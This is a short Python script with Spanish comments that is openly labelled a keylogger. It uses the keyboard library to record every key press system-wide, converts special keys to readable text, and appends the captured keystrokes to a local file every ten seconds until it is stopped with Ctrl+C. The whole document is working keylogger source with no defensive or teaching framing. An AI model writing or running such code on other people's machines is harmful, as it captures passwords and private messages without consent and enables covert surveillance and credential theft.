# pip install keyboard

import keyboard
import time

# Creamos una lista para guardar las teclas presionadas
teclas_presionadas = []

# Esta función se ejecuta cada vez que se presiona una tecla
def registrar_tecla(tecla):
    nombre = tecla.name  # Obtenemos el nombre de la tecla
    if len(nombre) > 1:
        # Si es una tecla especial (ej: espacio, enter)
        if nombre == "space":
            nombre = " "
        elif nombre == "enter":
            nombre = "\n"
        elif nombre == "decimal":
            nombre = "."
        else:
            nombre = f"[{nombre}]"
    teclas_presionadas.append(nombre)

# Asociamos la función al evento de presionar tecla
keyboard.on_press(registrar_tecla)

# Guardar cada cierto tiempo (por ejemplo, cada 10 segundos)
def guardar_en_archivo():
    with open("registro_teclas.txt", "a", encoding="utf-8") as f:
        f.write("".join(teclas_presionadas))
    teclas_presionadas.clear()

# Bucle principal: guarda el contenido cada 10 segundos
print("Keylogger iniciado... (Ctrl+C para salir)")

try:
    while True:
        time.sleep(10)
        guardar_en_archivo()
except KeyboardInterrupt:
    print("\nPrograma finalizado.")
    guardar_en_archivo()
    